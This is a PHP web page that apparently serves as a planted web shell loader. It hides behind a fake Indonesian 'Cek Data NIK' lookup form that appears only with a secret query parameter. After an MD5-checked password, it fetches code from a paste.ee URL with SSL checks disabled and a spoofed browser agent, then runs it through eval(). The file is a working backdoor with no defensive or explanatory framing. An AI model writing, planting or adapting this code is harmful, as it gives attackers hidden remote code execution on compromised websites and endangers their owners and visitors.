<?php
session_start();

/**
 * Function to get URL contents using various methods
 *
 * @param string $url The URL to fetch
 * @return string|false The contents of the URL or false on failure
 */
function geturlsinfo($url) {
    $url_get_contents_data = false;

    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION['Anon7'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['Anon7']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    }

    return $url_get_contents_data;
}

/**
 * Function to check if a user is logged in
 *
 * @return bool True if the user is logged in, false otherwise
 */
function is_logged_in() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '940f2f33a763bc20fe18ff1bf748d432';

    if (md5($entered_password) === $hashed_password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['Anon7'] = 'Anon7';
    } else {
        echo "<div class='alert alert-danger' role='alert'>Data Anggota Tidak Ada</div>";
    }
}

if (is_logged_in()) {
    $a = geturlsinfo('https://paste.ee/r/Rlf7E');
    eval('?>' . $a);
} else {
    if (isset($_GET['cari'])) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Cek Data NIK</title>
            <!-- Bootstrap CSS -->
            <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        </head>
        <body>
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-md-4">
                        <div class="card mt-5">
                            <div class="card-header">
                                <h3 class="text-center">Cek Data NIK</h3>
                            </div>
                            <div class="card-body">
                                <form method="POST" action="">
                                    <div class="form-group">
                                        <label for="nik">NIK:</label>
                                        <input type="password" class="form-control" id="nik" name="password">
                                    </div>
                                    <button type="submit" class="btn btn-primary btn-block">
                                        <i class="fa fa-search"></i> Cari
                                    </button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Bootstrap JS and dependencies -->
            <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script>
            <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
        </body>
        </html>
        <?php
    } else {
        echo "Leviathan Perfect Hunter";
    }
}
?>
